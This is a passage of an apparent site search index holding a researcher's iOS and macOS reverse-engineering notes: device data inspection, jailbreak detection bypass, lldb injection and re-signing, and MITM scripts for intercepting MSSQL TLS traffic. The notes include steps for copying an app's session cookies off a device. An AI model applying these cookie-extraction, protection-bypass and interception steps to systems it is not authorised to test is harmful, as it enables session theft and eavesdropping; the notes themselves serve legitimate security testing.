file-cmds (chflags, compress, ipcrm, ipcs, pax) - basic-cmds (msg, uudecode, uuencode, write) - shell-cmds (killall, mktemp, renice, time, which) - system-cmds (iostat, login, passwd, sync, sysctl) - diskdev-cmds (mount, quota, fsck, fstyp, fdisk, tunefs) - network (arp, ifconfig, netstat, route, traceroute) - syslog (syslogon, syslogoff); /var/log/syslog - wget, ncdu, lsof, file, less - gdb (ar, nm, objdump, ranlib, strip, addr2line, gdb, objdump) Related iOS Notes~ Frida \u0026amp; Objection Tutorial LLDB Pure Reverse Engineering Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis References\niOS Private Frameworks, Latest Listing iOS Pentesting Checklist iOS WebViews Debugging iOS CheatSheet Decrypting apps from AppStore Reverse Engineering Tools iOS Static Analysis iOS Internals and Security Testing iOS Hacking Resources ", 
        "url": "\/ios-reverse-engineering\/"
    },
    
    
    
    "\/ios-static-analysis\/": {
        
        "title": "iOS Static Analysis",
        "tags": [],
        "content": "Watch iPhone device System Logs\n$ idevicesyslog [connected] Nov 18 17:58:52 kernel[0] \u0026lt;Notice\u0026gt;: EXC_RESOURCE -\u0026gt; duetexpertd[37309] exceeded mem limit: InactiveHard 14 MB (fatal) Nov 18 17:58:52 kernel[0] \u0026lt;Notice\u0026gt;: duetexpertd[37309] Corpse allowed 1 of 5 Nov 18 17:58:52 backboardd(IOKit)[21224] \u0026lt;Notice\u0026gt;: Connection removed: IOHIDEventSystemConnection uuid:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX pid:37309 process:duetexpertd type:Monitor entitlements:0x2 caller:AppPredictionInternal: \u0026lt;redacted\u0026gt; + 44 attributes:(null) state:0x1 events:14456 mask:0x1000 dropped:0 dropStatus:0 droppedMask:0x0 lastDroppedTime:NONE ... Inspect App. Bundle (Persisted Data)\n// Compiled code, statically linked files, compressed NIBs, et al. $ cd /private/var/containers/Bundle/Application/\u0026lt;guid\u0026gt;/AppName.app Inspect Sandboxed Data (Persisted Data)\n// Contains sandbox dirs (Documents, Library, etc.) for an App $ cd /private/var/mobile/Containers/Data/Application/ $ ls -lrt // List all apps., the one at the bottom are freshly installed $ cd ./[appname-_guid]/Documents/ $ cd ./[appname-_guid]/Library/ Inspect device databases\n$ cd /private/var/Keychains # TrustStore.sqlite3 # keychain-x.db # pinningrules.sqlite3 Inspect binarycookies for an App. (Persisted Data)\n$ cat /private/var/mobile/Containers/Data/Application/[appname-_guid]/Library/Cookies/Cookies.binarycookies // Pull from Device to Host OS tmp dir. $ scp -P 2222 root@localhost:/private/var/mobile/Containers/Data/Application/[appname-_guid]/Library/Cookies/Cookies.binarycookies /tmp/cookies.bin // Extract Cookie data $ python BinaryCookieReader.py /tmp/cookies.bin # Cookie : xxxxx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; domain=.example.com; path=/; expires=Thu, 14 Dec 2030; # ............ Spoofing iOS Build Version\n// Note: only change minimum iOS version of a specific app\u0026#39;s plist, not for the entire device. $ ssh root@127.0.0.1 -p2222 root# cd /System/Library/CoreServices/ root# cat SystemVersion.plist root# vi SystemVersion.plist Other possible analysis\nFind all JSON and Plist files in app bundle and see if there are any disclosures NSAllowsArbitraryLoads - Disables App Transport Security (ATS), allowing weak TLS configs CFBundleURLTypes - Custom Scheme URLs that can be exploited further (see this) AFNetworking 2.5.1 - Version and below are vulnerable to MITM if there was no SSL pinning applied ", 
        "url": "\/ios-static-analysis\/"
    },
    
    
    
    "\/jailbreak-bypass\/": {
        
        "title": "Jailbreak Bypass",
        "tags": [],
        "content": "Bypass Common iOS Jailbreak Bypasses\nLibery Lite via Cydia, then go to iOS Settings, and select the application (Recommended) Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Cycript via REPL-based Dynamic Instrumentation Manual Patching, the old school way Detection Sandbox Integrity Check:\nOn iOS devices, user apps installed in /var/mobile/Application are restricted by the sandbox, while System Apps installed in /Application are not restricted by the sandbox. The below snippet would try to call fork(), opendir(), and system(), and therefore fail if any of the calls succeeded.\nvoid SandboxIntegrityCheck() { int result = fork(); // also vfork(), popen() if(!result) exit(0); if(result \u0026gt;= 0) // jailbreak detected, app. shouldn\u0026#39;t be allowed to `fork()` {sandbox_is_compromised = 1}; opendir(‚Äú/dev‚Äù); // also system(), getgid() // confirmation-bias to jailbreak } FileSystem Detection\nDetect the existence of common jailbreak tools, directories and files. Typical Jailbreak detection method, and quite easy to bypass.\nvoid FileSystemCydiaCheck() { struct stat s; int is_jailbroken = stat(‚Äú/Applications/Cydia.app‚Äù, \u0026amp;s) == 0; if (is_jailbroken != 0) { // jailbreak detected, app. can \u0026#39;stat\u0026#39; on the Cydia bundle {jailbreak_detected = 1}; } } # besides, many other paths are checked // /Library/MobileSubstrate/MobileSubstrate.dylib // /private/var/stash // /private/var/lib/apt // /private/var/lib/cydia // /usr/libexec/cydia // ... Detect Mount Point\nUsing /etc/fstab file and making it smaller, as the original fstab is fixed, depending on the iPhone device. In this case, the use of fstab would be integrity check to detect jailbreak detection.\nvoid fsStabJailed() { struct stat s; stat(\u0026#34;/etc/fstab\u0026#34;, \u0026amp;s); return s.st_size;\t// Depending on the retval of \u0026#39;s\u0026#39;, the device is jailed } Detect Soft Links\nDetect /Applications soft link. If the device is jailbroken, the softlink will be replaced to /var/stash/\u0026lt;PATH\u0026gt; directory, which usually is not case on jailed devices.\nvoid checkSoftLinks() { struct stat s; if (lstat(\u0026#34;/Applications\u0026#34;, \u0026amp;s) != 0) { if (s.st_mode \u0026amp; S_IFLNK) { exit(-1); // Detected jailbroken device } } } # besides, many other paths are checked // /Library/Ringtones // /Library/WallPaper // /usr/arm-apple-darwin9 // /usr/include // /usr/libexec // /usr/share Detect Cydia URL Scheme\nCydia will create a cydia:// URL scheme on the jailbroken device. If an iOS app. can call NSURL handler with this scheme, the device is jailbroken.\n# Objective-C sample NSURL *url [NSURL URLWithString @‚Äùcydia://package/com.example.package‚Äù]; Detection of KernelEnv Variables\nWhen a device is jailbroken, two kernel environment variables will be added to bypass iOS Code Signing mechanism. These variables are proc_enforce, and vnode_enforce. Using the sysctlbyname() function, an app can check this system information and validate the device.\n/** on a jailed device, the following values should be \u0026#39;1\u0026#39; */ sysctlbyname(security.mac.proc_enforce) sysctlbyname(security.mac.vnode_enforce) Detect DYLD_INSERT_LIBRARIES in running process\nOn a jailbroken device, a MobileSubstrate.dylib will be injected via DYLD_INSERT_LIBRARIES in the environment variable. In fact, getenv('DYLD_INSERT_LIBRARIES') will return NULL \u0026ndash; on a jailed device, or \\0 on a jailbroken device.\n$ getenv(\u0026#34;DYLD_INSERT_LIBRARIES\u0026#34;) ", 
        "url": "\/jailbreak-bypass\/"
    },
    
    
    
    "\/javascript-deobfuscation\/": {
        
        "title": "Javascript Deobfuscation",
        "tags": [],
        "content": "Usually, Javascript files are minified before deploying to production, and such minified scripts are then served to the end user.\nDetect Obfuscation obfuscation-detector detects different types of JS obfuscation by their AST structure.\n$ npm install obfuscation-detector $ vim detect.js # const fs = require(\u0026#39;fs\u0026#39;); # const detectObfuscation = require(\u0026#39;obfuscation-detector\u0026#39;); # # const code = fs.readFileSync(\u0026#39;obfuscated.js\u0026#39;, \u0026#39;utf-8\u0026#39;); # // const all_matching_obfuscation_types = detectObfuscation(code, false); # const most_likely_obfuscation_type = detectObfuscation(code); # console.log(`Obfuscation type is probably ${most_likely_obfuscation_type}`); Restringer Restringer deobfuscates Javascript files and reconstruct its strings. Simplify cumbersome logic where possible, while adhering to scope limitations. You can use the online version, or if you have multiple files to deobfuscate, then use it locally:\n$ npm install restringer $ restringer # Usage: restringer input_filename [-h] [-c] [-q | -v] [-m M] [-o [output_filename]] # # positional arguments: # input_filename The obfuscated JS file # # optional arguments: # -h, --help Show this help message and exit. # -c, --clean Remove dead nodes from script after deobfuscation is complete (unsafe). # -q, --quiet Suppress output to stdout. Output result only to stdout if the -o option is not set. # Does not go with the -v option. # -m, --max-iterations M Run at most M iterations # -v, --verbose Show more debug messages while deobfuscating. Does not go with the -q option. # -o, --output [output_filename] Write deobfuscated script to output_filename. ", 
        "url": "\/javascript-deobfuscation\/"
    },
    
    
    
    "\/linux-notes\/": {
        
        "title": "Linux Notes",
        "tags": [],
        "content": "Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username ", 
        "url": "\/linux-notes\/"
    },
    
    
    
    "\/list-of-tools\/": {
        
        "title": "List of Tools",
        "tags": [],
        "content": "apktool, android, openssl\n", 
        "url": "\/list-of-tools\/"
    },
    
    
    
    "\/lldb-for-ios\/": {
        
        "title": "lldb for iOS",
        "tags": [],
        "content": "Setup LLDB for iOS remote debugging\nInstall lldb on Host OS (MacOS), and all necessary USB debugging toolset.\n$ brew install lldb libplist libusb ldid # ... $ brew install iproxy // tunnel ssh traffic to usb $ iproxy 2222 22 // will tunnel port/2222(usb) to port/22(ssh) $ iproxy 23999 22 // will tunnel port/23999(usb) to port/22(ssh) /** we are tunneling 2x ports because one will be used for */ /** iOS Device shell, and the second one, specifically for the */ /** lldb (debugserver) */ Sign the debugserver so that it can attach to iOS apps. To do so, create a new signature file named entitlements.plist.\n$ vi entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.springboard.debugapplications\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;task_for_pid-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;run-unsigned-code\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; After creating the entitlements.plist file with above content, use codesign tool to Code Sign your debugserver, and then move debugserver to your iPhone device.\n$ codesign -s - --entitlements entitlements.plist -f debugserver $ scp debugserver root@127.0.0.1:/bin/debugserver\t// this will copy signed debugserver to iPhone device The above process is automatically completed in case you use XCode daily, and you already debugged your own app. In this case, the debugserver is located on your iPhone device in /Developer/usr/bin.\n(optional) Copy ARMDisassembler to improve code readability from within lldb and debugserver:\n// be sure to change DeviceSupport/?.?/ to your Device version $ cp /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport/?.?/DeveloperDiskImage.dmg/Library/PrivateFrameworks/ARMDisassembler.framework ARMDisassembler.framework // copy *framework to your device $ scp ‚Äìr ‚Äìp ARMDisassembler.framework root@127.0.0.1:/System/Library/PrivateFrameworks Start an lldb-server from your iPhone device:\nroot# /bin/debugserver # debugserver host:port [program-name program-arg1 program-arg2 ...] # debugserver host:port --attach=\u0026lt;pid\u0026gt; # debugserver host:port --attach=\u0026lt;process_name\u0026gt; # (ie. starting debugserver) root# /bin/debugserver 127.0.0.1:22 /AppName.app/Binary root# /bin/debugserver 127.0.0.1:22 --attach=7778 From the Host OS (MacOS), start the lldb and use process connect to initialise a connection between your Host and your iPhone device.\n$ lldb $ (lldb) process connect connect://127.0.0.1:23999 For WindowsOS users, you can use gikdbg which is now outdated. It\u0026rsquo;s an Android and iOS debugger developed on top of ollydbg. Supports, static analysis of ELF/Mach-O (arm64). The software runs on Windows.\nInject LOAD_DYLIB from LLDB\n(lldb) po dlopen(\u0026#34;/usr/lib/test.dylib\u0026#34;, 1) ", 
        "url": "\/lldb-for-ios\/"
    },
    
    
    
    "\/lldb-for-macos\/": {
        
        "title": "lldb for MacOS",
        "tags": [],
        "content": "Click Here if you are looking for iOS-specific lldb notes. Scroll below to see attaching errors and workaround.\nCommands/Assistance chisel is a collection of LLDB commands to assist debugging iOS apps. swift_po substitutes po command for Swift, with edge cases avoidance. lldb-helpers is a collection of helpers for more precise breakpoints. Cheatsheet Objective-C Inject LOAD_DYLIB from LLDB \u0026ndash; load Cycript, or dylib of your choice\n(lldb) po dlopen(\u0026#34;/usr/lib/test.dylib\u0026#34;, 1) Important \u0026ndash; set a lldb language context to Objective-C:\n(lldb) settings set target.language objc Cast an address to object:\n(lldb) po ((MKPinAnnotationView *)0x7df67c50).alpha Swift Important \u0026ndash; set a lldb language context to Swift:\n(lldb) settings set target.language swift Type-casting a memory address to a class:\n(lldb) po unsafeBitCast(0x600003973c20, to: MyModule.MyClass.self) Find Image containing the given symbol:\n# =\u0026gt; @see \u0026#39;man dladdr\u0026#39; (lldb) image lookup -n \u0026#34;-[NSTextInputContext selectedRange_RTI]\u0026#34; Import a Library in the lldb context:\n# =\u0026gt; Library (lldb) expr -l Swift -- import UIKit # =\u0026gt; Custom Classes (lldb) expr -l Swift -- import MyTestProject (lldb) expr -l Swift -- let $vc = unsafeBitCast(0x7fad22c066d0, ViewController.self) (lldb) expr -l Swift -- print($vc.view) Create a new class from lldb:\n(lldb) expression let $myHello = HelloClass() (lldb) po $myHello Call a method from a class:\n(lldb) po $myHello.hello() Get an object address of current instance:\n(lldb) p tabView.controlTint (NSControlTint) $R10 = defaultControlTint (lldb) p self (LearningStoryboard.NSTabViewController) $R11 = 0x00006080000e2280 { # =\u0026gt; then cast this address to x object. @see below. Cast an address to object:\n(lldb) e let $pin = unsafeBitCast(0x7df67c50, MKPinAnnotationView.self) (lldb) po $pin # =\u0026gt; then you can work with $pin as usual ‚Äì access properties, call methods, etc. Multiplatform (ObjC + Swift) If you want to run an lldb expression depending on the scope, use:\n(lldb) expression -l objc -o -- HelloClass* class = [[HelloClass alloc] init] # =\u0026gt; obj-c (lldb) expression -l swift -o -- let $myHello = HelloClass() # =\u0026gt; swift Errors and Workarounds Attach Failed Not allowed to attach to process\n(lldb) process attach --pid 76371 # =\u0026gt; or \u0026#39;lldb /Applications/SomeApp.app\u0026#39; error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:\n$ cat /tmp/debug_entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security-get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.cs.disable-library-validation\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.device.audio-input\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ codesign --force --options runtime --sign - --entitlements /tmp/debug_entitlements.plist /Applications/SomeApp.app Not allowed to attach to process\nNote: This is only for stand-alone binaries such is ls, cat and so on.\n$ lldb /usr/bin/login error: attach failed: attach failed Solution:\n$ cat /tmp/debug_entitlements.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security.get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ cp /usr/bin/login /tmp/login # requires entitling a copy of the binary, not the original $ sudo codesign --sign \u0026#34;signature\u0026#34; -f --timestamp --entitlements ./debug_entitlements.xml /tmp/login You are required to create signature certificate from the Keychain.app in MacOS.\nTerminated due to code signing error\nHappens when targeted application is not properly code signed. Usually happens when you added a new entitlement, but did not codesign a Mach-O binary:\n(lldb) process attach --pid 76371 # =\u0026gt; or \u0026#39;lldb /Applications/SomeApp.app\u0026#39; Process 8873 exited with status = 9 (0x00000009) Terminated due to code signing error Solution:\nCreate a Code Signing certificate from within Keychain.app in MacOS (ie. signature), and use it to code sign target application. The following will recursevly force code sign of all application resources.\n# switch signature with your code signing certificate $ codesign --deep --force -s \u0026#34;signature\u0026#34; /Applications/SomeApp.app ", 
        "url": "\/lldb-for-macos\/"
    },
    
    
    
    "\/macos-arm\/m1\/m2\/": {
        
        "title": "macOS ARM\/M1\/M2",
        "tags": [],
        "content": " M1 LLDB Configuration Using Frida against MachO on ARM Root-tree listing for selected topic.\n", 
        "url": "\/macos-arm\/m1\/m2\/"
    },
    
    
    
    "\/macos-mitm-on-tcp\/udp\/": {
        
        "title": "MacOS MITM on TCP\/UDP",
        "tags": [],
        "content": "Configure your MacOS to point /etc/private/hosts to real server.\nNext use the following script to print and return handlers.\n## basic intercept tcp macos desktop via /etc/private/hosts def handle_request(message): print(message) return message + b\u0026#34;\\x00\u0026#34; def handle_response(message): # Both functions must return a message. print(message) return message Run mitm_intercept.py with the following command line:\n$ mitm_intercept.py -l u:x.x.x.x:port t:x.x.x.x.x:port -t u:x.x.x.x:port x.x.x.x:port -p x.x.x.x:8080\nReferences:\nvia -l listener via u: \u0026amp; t: udp + tcp listener via -t target via -p proxy listener (burp) via -m (mix connection) performs TCP relay without SSL handshake In this case, the communication goes through the HTTP modification server running on 127.0.0.1:49999 (via MITM Intercept) and Burp\u0026rsquo;s proxy.\nConnection to MSSQL is made by TDS Protocol on top of TCP. The authentication itself is performed with TLS on top of the TDS protocol. To see intercept that TLS process, we will need two patchy modification scripts:\n# =\u0026gt; demo-script-handler-1.py from time import time from struct import pack from pathlib import Path def handle_request(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message with open(\u0026#34;msg_req\u0026#34; + str(time()), \u0026#34;wb\u0026#34;) as f: f.write(message[:8]) return message[8:] def handle_response(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message path = Path(\u0026#34;.\u0026#34;) try: msg_res = min(i for i in path.iterdir() if i.name.startswith(\u0026#34;msg_res\u0026#34;)) data = msg_res.read_bytes() msg_res.unlink() except ValueError: data = b\u0026#39;\\x12\\x01\\x00\\x00\\x00\\x00\\x01\\x00\u0026#39; return data[:2] + pack(\u0026#34;\u0026gt;h\u0026#34;, len(message)+8) + data[4:] + message # =\u0026gt; demo-script-handler-2.py from time import time from struct import pack from pathlib import Path def handle_request(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message path = Path(\u0026#34;.\u0026#34;) try: msg_req = min(i for i in path.iterdir() if i.name.startswith(\u0026#34;msg_req\u0026#34;)) data = msg_req.read_bytes() msg_req.unlink() except ValueError: data = b\u0026#39;\\x12\\x01\\x00\\x00\\x00\\x00\\x01\\x00\u0026#39; return data[:2] + pack(\u0026#34;\u0026gt;h\u0026#34;, len(message)+8) + data[4:] + message def handle_response(message): if message.startswith(b\u0026#34;\\x17\\x03\u0026#34;): return message with open(\u0026#34;msg_res\u0026#34; + str(time()), \u0026#34;wb\u0026#34;) as f: f.write(message[:8]) return message[8:]≈æ With that, and tmux:\nstart a backbone listener with script (1):\n$ python mitm_intercept.py -l 192.168.48.1:49801 -t 127.0.0.0.1:49801 -p 127.0.0.1:8080 -s demo-script-handler-1.py\nstart a tls proxy\n$ python mitm_intercept.py -m -l 127.0.0.1:49801 -t 127.0.0.1:49800 -p 127.0.0.1:8080 -w 127.0.0.1:49998 -lc cert.pem -lk key.pem -tv tls1 -ci ALL:eNULL\n(the above uses a listener configuration with a certificate and a private key, you are obligated to change tls version and the chipers manually. the target will be third listener) start a target listener with script (2):\n$ python mitm_intercept.py -l 127.0.0.1:49800 -t 192.168.48.128:49801 -p 127.0.0.1:8080 -s demo-script-handler-2.py -w 127.0.0.1:49997\nstart a target udp listener for targeted db:\n$ python mitm_intercept.py -l u:192.168.48.1:1434 -t u:192.168.48.128.1434 -p 127.0.0.1:8080 -w 127.0.0.1:49996\n", 
        "url": "\/macos-mitm-on-tcp\/udp\/"
    },
    
    
    
    "\/macos-notes\/": {
        
        "title": "MacOS Notes",
        "tags": [],
        "content": "Adding an application to Finder.app toolbar\nLocate the app. in your /Application folder. Lets say you want to use OpenTerminal-Lite app. as a toolbar menu in Finder.\nLocate the /Applications/OpenTerminal-Lite.app Use ‚åò+‚å• on keyboard, and drag-and-drop the app to Finder.app toolbar Yup, thats it Hide a folder on MacOS (using an attribute)\n$ chflags hidden /someones/desktop/folder Hide a symlink folder on MacOS\n$ chflags -h hidden /someones/desktop/folder Check Application entitlement\n# ~\u0026gt; brew install jtool # =\u0026gt; no visible entitlemens $ jtool --ent /Applications/MachOView.app /Applications/MachOView.app/Contents/MacOS//MachOView apparently does not contain any entitlements # =\u0026gt; with visible entitlements $ jtool --ent /Applications/ProtonVPN.app \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.application-identifier\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;J6S6Q257EK.ch.protonvpn.mac\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;com.apple.developer.maps\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; ... libSystem.B.dylib\nAll API rely on above library. For example, when the MachO Process starts, the above library will be loaded early in time so it can use other APIs.\nMount RaspberryPi / BananaPi SD Card\nNote: these instructions are outdated, please take a look at newer documentation in fuse-ext2 notes. The difference between the fuse-ext2 and ext4fuse is that the former allows for r/w on the mounted partition; and not only r/o, as is the case with ext4fuse.\nInsert SD Card in your card reader or Macbook. Then when the error pops-up, just hit \u0026ldquo;Ignore\u0026rdquo; (not Eject!).\nThe SD Card should be visible by the MacOS, but not mounted, as such:\n$ diskutil list ... /dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *15.9 GB disk2 1: Linux 1.3 GB disk2s1 (free space) 14.6 GB - Make sure to install macfuse, and ext4fuse:\n$ brew install macfuse $ brew install ext4fuse # =\u0026gt; might throw an error, @see below for instructions # 1) the first possibility is to install osxfuse first, and then try ext4fuse again # ie. # brew install --cask osxfuse # brew install ext4fuse # Make sure to reboot your system, because of the new Kext/Kernel extension. # 2) the other option is to manually force ext2fuse via the script. the script are #\tin this notes, right below. Add current $USER to the operator group, so it could have readonly permissions to the disk:\n$ sudo dscl . append /Groups/operator GroupMembership `whoami` We shall not forget important step right here, unmounting the disk from the MacOS host (not the partition):\n$ sudo diskutil unmountDisk /dev/disk2 Make a mountable directory on your Mac and mount the SD card ext4 partition:\n$ mkdir ~/raspberry # =\u0026gt; or /Volumes/raspberry for natural choice $ sudo ext4fuse /dev/disk2s1 ~/raspberry -o allow_other If you get fuse: no mount point error, it means you haven\u0026rsquo;t set correct mount directory (ie. ~/raspberry). Go back and repeat the steps as instructed.\nnote: adding allow_other for this SD card should make it readable by everyone.\nTo unmount the SD Card, just simply use:\n$ sudo diskutil unmount /dev/disk2s1 $ sudo diskutil unmountDisk /dev/disk2 $ sudo diskutil unmountDisk ~/raspberry Installing ext4fuse in MacOS\nDownload the script below, and save it somewhere in your machine, then run:\n$ brew install --formula --build-from-source /tmp/ext4fuse.rb References:\nMount Raspberry Pi SD Card on MacOS (R/O) Mount Raspberry Pi SSD on Big Sur Mount an ext4 paritition on MacOS Mount ext4 Filesystem on MacOS (note: paste the following in /tmp/ext4fuse.rb:\n# =\u0026gt; cat /tmp/ext4fuse.rb class MacFuseRequirement \u0026lt; Requirement fatal true satisfy(build_env: false) { self.class.binary_mac_fuse_installed? } def self.binary_mac_fuse_installed? File.exist?(\u0026#34;/usr/local/include/fuse/fuse.h\u0026#34;) \u0026amp;\u0026amp; !File.symlink?(\u0026#34;/usr/local/include/fuse\u0026#34;) end env do ENV.append_path \u0026#34;PKG_CONFIG_PATH\u0026#34;, HOMEBREW_LIBRARY/\u0026#34;Homebrew/os/mac/pkgconfig/fuse\u0026#34; ENV.append_path \u0026#34;PKG_CONFIG_PATH\u0026#34;, \u0026#34;/usr/local/lib/pkgconfig\u0026#34; unless HOMEBREW_PREFIX.to_s == \u0026#34;/usr/local\u0026#34; ENV.append_path \u0026#34;HOMEBREW_LIBRARY_PATHS\u0026#34;, \u0026#34;/usr/local/lib\u0026#34; ENV.append_path \u0026#34;HOMEBREW_INCLUDE_PATHS\u0026#34;, \u0026#34;/usr/local/include/fuse\u0026#34; end end def message \u0026#34;macFUSE is required. Please run `brew install --cask macfuse` first.\u0026#34; end end class Ext4fuse \u0026lt; Formula desc \u0026#34;Read-only implementation of ext4 for FUSE\u0026#34; homepage \u0026#34;https://github.com/gerard/ext4fuse\u0026#34; url \u0026#34;https://github.com/gerard/ext4fuse/archive/v0.1.3.tar.gz\u0026#34; sha256 \u0026#34;550f1e152c4de7d4ea517ee1c708f57bfebb0856281c508511419db45aa3ca9f\u0026#34; license \u0026#34;GPL-2.0\u0026#34; head \u0026#34;https://github.com/gerard/ext4fuse.git\u0026#34; bottle do sha256 cellar: :any, catalina: \u0026#34;446dde5e84b058966ead0cde5e38e9411f465732527f6decfa1c0dcdbd4abbef\u0026#34; sha256 cellar: :any, mojave: \u0026#34;88c4918bf5218f99295e539fe4499152edb3b60b6659e44ddd68b22359f512ae\u0026#34; sha256 cellar: :any, high_sierra: \u0026#34;fc69c8993afd0ffc16a73c9c036ca8f83c77ac2a19b3237f76f9ccee8b30bbc9\u0026#34; sha256 cellar: :any, sierra: \u0026#34;fe8bbe7cd5362f00ff06ef750926bf349d60563c20b0ecf212778631c8912ba2\u0026#34; sha256 cellar: :any, el_capitan: \u0026#34;291047c821b7b205d85be853fb005510c6ab01bd4c2a2193c192299b6f049d35\u0026#34; sha256 cellar: :any, yosemite: \u0026#34;b11f564b7e7c08af0b0a3e9854973d39809bf2d8a56014f4882772b2f7307ac1\u0026#34; end depends_on \u0026#34;pkg-config\u0026#34; =\u0026gt; :build on_macos do depends_on MacFuseRequirement =\u0026gt; :build end on_linux do depends_on \u0026#34;libfuse\u0026#34; end def install system \u0026#34;make\u0026#34; bin.install \u0026#34;ext4fuse\u0026#34; end end ", 
        "url": "\/macos-notes\/"
    },
    
    
    
    "\/macos-reverse-engineering\/": {
        
        "title": "MacOS Reverse Engineering",
        "tags": [],
        "content": "It helps knowing more deep technical stuff for the overview of those notes. Besides, also take a look at: Ghidra, LLDB for MacOS, and Hopper for MacOS. Notes on dyld Injection are also handful for Mach-O RE tasks.\nAccessing Logs on System Level To access the Host OS (MacOS) logs from the command line, the log command can be used.\n# =\u0026gt; will log via default settings $ (sudo) log show --style syslog --predicate \u0026#39;process == \u0026#34;com.durakiconsulting.appname\u0026#34;\u0026#39; # =\u0026gt; will log with debug \u0026amp; info $ (sudo) log show --style syslog --predicate \u0026#39;process == \u0026#34;com.durakiconsulting.appname\u0026#34;\u0026#39; --debug --info You may also filter results depending on use-case:\n# =\u0026gt; will log via default, and match only \u0026#34;Error\u0026#34; message $ (sudo) log show --style syslog --predicate \u0026#39;process == \u0026#34;com.durakiconsulting.appname\u0026#34; \u0026amp;\u0026amp; eventMessage CONTAINS \u0026#34;Error\u0026#34;\u0026#39; Additonally, run the binary from the Terminal, which will yield stdout and stderr logs just from that specific app.\n$ /Applications/AppName.app/Contents/MacOS/AppName Dump System LaunchServices Basically, OS X LaunchServices is how an application is found to run when you double-click on a document. If the program is in /Applications, or you launch it at least once, then LaunchServices should detect it. LaunchServices contains a big, long list of all the Applications, and which ones accept documents of which type. So if you have an Application that is not \u0026ldquo;registering\u0026rdquo; correctly with LaunchServices, try this in the Terminal:\nVia lsregister utility:\n$ /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Versions/Current/Support/lsregister -dump Via defaults cli utility:\n$ defaults read com.apple.LaunchServices # | grep -v LSBundleLocator¬†Interesting Paths /Users/\u0026lt;USER\u0026gt;/Library/HTTPStorages/ (Contains all App. bundles HTTP Storage, incl. cookies et al) Code Signing Due to Apple being \u0026ldquo;security-oriented\u0026rdquo;, they included additional hardened layer that sits between native GateKeeper (ring3) and the XPC (ring0) surface. There are some steps that you can take to minimise the troublesome of reversing Apple apps. Fortunately, Apple provides their full PKI list which can be used to revocate CA-X.509 Certificates.\nFirst, decode the original provision file of a targeted Application (it\u0026rsquo;s a CMS Encrypted XML):\n$ security cms -D -i /Applications/AppName.app/Contents/MacOS/embedded.provisionprofile \u0026gt; embedded.plist\t# =\u0026gt; or .mobileprovision for iOS This will create an XML file containing the original Provision File. Next, we can use plist to extract the Entitlements attributes:\n$ plutil -p embedded.plist You will have to create a new project in XCode, add Capability by clicking Project Root -\u0026gt; Targets and pressing \u0026quot;+ Capability\u0026quot; in the top-left corner. This will allow you to build placeholder for a Provisioning Profile during the project build (ie. CodeSign phase).\nCode Signing Toolset Tools I often use\njtool (code signing), spctl (manage system\u0026#39;s policy, controls gatekeeper), codesign (macos codesign utility), security (decode 